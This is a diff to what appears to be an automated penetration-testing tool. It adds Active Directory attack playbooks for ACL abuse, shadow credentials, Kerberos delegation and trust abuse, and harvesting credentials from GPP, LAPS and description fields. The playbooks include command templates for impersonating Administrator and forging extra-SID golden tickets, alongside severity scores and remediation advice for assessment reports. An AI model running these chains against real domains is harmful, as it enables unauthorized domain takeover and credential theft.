@@ -32,7 +32,7 @@ from pathlib import Path
 
 
 # Bump when the built-in playbooks change so existing installs re-seed them.
-_BUILTIN_VERSION = 5
+_BUILTIN_VERSION = 8
 
 # Controlled vocabulary the step builder offers (free text is still allowed).
 # `domain`/`signing`/`host_info` are the reconnaissance variables an early
@@ -40,7 +40,8 @@ _BUILTIN_VERSION = 5
 ARTIFACTS = [
     "domain", "host_info", "signing", "userlist", "credential", "hash", "ticket",
     "spn_hash", "asrep_hash", "shares", "relay_targets", "coerced", "machine_account",
-    "adcs_vuln", "certificate", "mssql_exec", "admin", "flag",
+    "adcs_vuln", "certificate", "mssql_exec", "delegation", "trust", "acl_write",
+    "gpp", "admin", "flag",
 ]
 # Execution triggers the sequence runner understands (see sequence._trigger_ok).
 # A step fires when its trigger is true against the current variables.
@@ -443,6 +444,149 @@ DEFAULT_PLAYBOOKS = [
                   "ticketer (set krbtgt hash + domain SID)", ["hash"], ["ticket", "admin"],
                   "ticketer -nthash <krbtgt> -domain-sid <SID> Administrator → golden TGT "
                   "for full-domain persistence.", "final"),
+        ],
+    },
+    {
+        "id": "acl-abuse",
+        "name": "Abusable AD ACLs → privilege escalation",
+        "summary": "Find objects your account can write (GenericAll/WriteDACL/GenericWrite/"
+                   "ForceChangePassword) and abuse them: targeted Kerberoast, shadow "
+                   "credentials, group add, or password reset.",
+        "match": {"any_ports": [389, 445], "signals": ["username"]},
+        "run": {},
+        "steps": [
+            _step(1, "Collect the ACL graph (BloodHound)", "have credential",
+                  "bloodhound_python", ["credential"], [],
+                  "Collect users/groups/ACLs so you can see which principals your account "
+                  "has dangerous rights over."),
+            _step(2, "Enumerate writable objects", "have credential", "bloodyad",
+                  ["credential"], ["acl_write"],
+                  "bloodyAD get writable — list every object your account can modify.",
+                  severity="High", cvss="8.1",
+                  finding_title="Abusable Active Directory ACLs (GenericAll / WriteDACL / …)",
+                  impact="The account holds dangerous write rights over other principals, "
+                         "allowing takeover via targeted Kerberoast, shadow credentials, "
+                         "group membership, or a password reset — often up to Domain Admin.",
+                  recommendation="Audit and remove excessive ACEs (GenericAll/WriteDACL/"
+                         "WriteOwner/GenericWrite/ForceChangePassword); apply least privilege "
+                         "and tiering; monitor DACL changes."),
+            _step(3, "Targeted Kerberoast the writable users", "have credential",
+                  "targeted_kerberoast", ["acl_write", "credential"], ["spn_hash"],
+                  "Set an SPN on each user you can write, roast it, then remove the SPN — "
+                  "yields a crackable ticket without touching their password."),
+            _step(4, "Crack the tickets", "have hashes", "crack_hashes",
+                  ["spn_hash"], ["credential"],
+                  "Crack the targeted-roast hashes offline.", "final"),
+        ],
+    },
+    {
+        "id": "shadow-credentials",
+        "name": "Shadow Credentials (msDS-KeyCredentialLink)",
+        "summary": "When you can write to a target account, add a key credential and "
+                   "authenticate as it to recover its NT hash + TGT — no password reset.",
+        "match": {"any_ports": [88, 389, 445], "signals": ["username"]},
+        "run": {},
+        "steps": [
+            _step(1, "Add key + authenticate (certipy shadow auto)", "have credential",
+                  "certipy_shadow", ["credential"], ["certificate", "hash"],
+                  "certipy shadow auto -account <target$> — adds a KeyCredential, gets the "
+                  "target's NT hash/TGT via PKINIT, then removes the key.", "final",
+                  severity="High", cvss="8.1",
+                  finding_title="Shadow Credentials (writable msDS-KeyCredentialLink)",
+                  impact="Write access to a target's msDS-KeyCredentialLink lets an attacker "
+                         "add a certificate key and impersonate the account (recovering its "
+                         "hash/TGT) without resetting its password.",
+                  recommendation="Restrict write access to msDS-KeyCredentialLink, deploy "
+                         "and enforce a strong Key Trust / ADCS configuration, and monitor "
+                         "KeyCredentialLink changes."),
+        ],
+    },
+    {
+        "id": "delegation-abuse",
+        "name": "Kerberos delegation abuse",
+        "summary": "Enumerate unconstrained / constrained / RBCD delegation and abuse it to "
+                   "impersonate a privileged user (S4U2Self/Proxy) up to Domain Admin.",
+        "match": {"any_ports": [88, 389, 445], "signals": ["username"]},
+        "run": {},
+        "steps": [
+            _step(1, "Enumerate delegation", "have credential", "finddelegation",
+                  ["credential"], ["delegation"],
+                  "findDelegation: list accounts with unconstrained, constrained "
+                  "(AllowedToDelegate) or resource-based delegation.",
+                  severity="High", cvss="8.1",
+                  finding_title="Kerberos Delegation Misconfiguration",
+                  impact="Accounts with unconstrained/constrained/RBCD delegation can be "
+                         "abused to impersonate any user (including Domain Admins) to the "
+                         "delegated services, leading to domain compromise.",
+                  recommendation="Remove unconstrained delegation; scope constrained "
+                         "delegation tightly; restrict who can write "
+                         "msDS-AllowedToActOnBehalfOfOtherIdentity; mark admins 'sensitive, "
+                         "cannot be delegated' and add them to Protected Users."),
+            _step(2, "Impersonate via S4U (constrained/RBCD)", "have credential",
+                  "get_st (set spn + impersonate=Administrator)", ["delegation"],
+                  ["ticket", "admin"],
+                  "getST -spn <svc/target> -impersonate Administrator → .ccache; for "
+                  "unconstrained, coerce a DC to the delegation host and extract its TGT.",
+                  "final"),
+        ],
+    },
+    {
+        "id": "trust-abuse",
+        "name": "Domain / forest trust abuse",
+        "summary": "Enumerate trusts, then escalate child→parent (or across a forest trust) "
+                   "with an inter-realm ticket carrying the parent Enterprise Admins SID.",
+        "match": {"any_ports": [88, 389, 445], "signals": ["username"]},
+        "run": {},
+        "steps": [
+            _step(1, "Enumerate domain/forest trusts", "have credential",
+                  "netexec_ldap", ["credential"], ["trust"],
+                  "LDAP query for trustedDomain objects — map parent/child and cross-forest "
+                  "trusts and their attributes/direction.",
+                  args={"action": "--query (objectClass=trustedDomain) *"},
+                  severity="Medium", cvss="6.5",
+                  finding_title="Abusable Domain / Forest Trust",
+                  impact="An intra-forest (child→parent) trust — and a forest trust without "
+                         "SID filtering — lets a child Domain Admin escalate to Enterprise "
+                         "Admin / the trusting forest via SID history in a forged ticket.",
+                  recommendation="Enable SID filtering / quarantine on trusts, treat the "
+                         "forest (not the domain) as the security boundary, and tier admins."),
+            _step(2, "Get the domain SID", "have credential", "lookupsid",
+                  ["credential"], [],
+                  "lookupsid → the domain SID needed to forge the inter-realm ticket."),
+            _step(3, "Child → parent (extra-SID golden ticket)", "have credential",
+                  "raisechild (or ticketer -extra-sid <parent>-519)",
+                  ["hash", "trust"], ["ticket", "admin", "flag"],
+                  "From child DA: dump child krbtgt, forge a TGT with the parent Enterprise "
+                  "Admins SID (…-519) — Enterprise Admin on the forest root.", "final"),
+        ],
+    },
+    {
+        "id": "creds-in-ad",
+        "name": "Credentials exposed in AD (GPP / description / LAPS)",
+        "summary": "Harvest credentials that live in the directory: GPP cpassword in SYSVOL, "
+                   "passwords in user description fields, and readable LAPS passwords.",
+        "match": {"any_ports": [389, 445], "signals": ["username"]},
+        "run": {},
+        "steps": [
+            _step(1, "GPP cpassword in SYSVOL", "have credential", "netexec_module",
+                  ["credential"], ["gpp"],
+                  "nxc smb -M gpp_password: decrypt cached Group Policy Preference passwords "
+                  "from SYSVOL (AES key is public).", args={"protocol": "smb", "module": "gpp_password"},
+                  severity="High", cvss="7.5",
+                  finding_title="Credentials Exposed in AD (GPP / description / LAPS)",
+                  impact="Reusable credentials are stored in the directory (GPP cpassword, "
+                         "user description fields, or LAPS readable by too many principals), "
+                         "recoverable by any domain user.",
+                  recommendation="Remove GPP passwords (KB2962486), never store secrets in "
+                         "description fields, and restrict LAPS read rights to admins."),
+            _step(2, "Passwords in description fields", "have credential", "netexec_module",
+                  ["credential"], ["gpp"],
+                  "nxc ldap -M get-desc-users: dump user description fields (often hold "
+                  "passwords).", args={"protocol": "ldap", "module": "get-desc-users"}),
+            _step(3, "Readable LAPS passwords", "have credential", "netexec_module",
+                  ["credential"], ["gpp"],
+                  "nxc ldap -M laps: read LAPS local-admin passwords your account can see.",
+                  "final", args={"protocol": "ldap", "module": "laps"}),
         ],
     },
 
